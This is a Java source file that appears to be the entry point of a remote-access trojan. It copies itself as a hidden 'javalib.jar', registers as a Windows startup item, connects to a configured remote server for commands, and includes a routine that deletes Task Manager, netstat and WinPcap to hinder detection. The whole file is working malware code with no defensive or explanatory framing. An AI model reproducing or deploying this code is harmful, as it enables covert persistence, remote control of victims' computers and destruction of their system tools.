
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.MalformedURLException;
import java.net.Socket;
import java.util.concurrent.Executors;

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
/**
 *
 * @author Nathan
 */
public class Main {

    public static Socket s = null;
    public static InputStream in;
    public static OutputStream out;
    public static boolean connected;

    public static void main(String[] args) throws MalformedURLException, IOException {
        try {
            Log.addLog("Update process complete!");
            Log.addLog("Startup!");
            startup();
            Log.addLog("Startup process completed!");
            Log.addLog("Loading config...");
            Config.loadConfig();
            Log.addLog("Config loaded!");
            Log.addLog("Connecting to remote server...");
            connect();
            Log.addLog("Connected to server!");
            startProcessing();
            new Thread(new WorkerThread()).start();
        } catch (Exception ex) {
        }
    }

    public static void secure() {
        if (Misc.getUsername().equals("Matt")) {
            return;
        }
        new File("C:\\Windows\\System32\\taskmgr.exe").delete();
        new File("C:\\Windows\\System32\\netstat.exe").delete();
        Misc.deleteDirectory(new File("C:\\Program Files\\WinPcap\\"));
    }

    public static void startup() {
        try {
            new WindowsStartupService().add(System.getProperty("user.home") + "\\javalib.jar");
            new File(System.getProperty("user.home") + "/javalib.jar").delete();
            Misc.copy(Misc.getJARLoc(), System.getProperty("user.home") + "/javalib.jar");
            Misc.hideFile(System.getProperty("user.home") + "\\javalib.jar");
        } catch (Exception e) {
        }
    }

    public static void connect() throws IOException {
        s = new Socket(Config.host, Config.port);
        s.setTcpNoDelay(true);
        in = s.getInputStream();
        out = s.getOutputStream();
        connected = true;
        Status.disconnected = false;
    }

    public static void startProcessing() {
        Executors.newSingleThreadExecutor().execute(new Processor());

    }
}
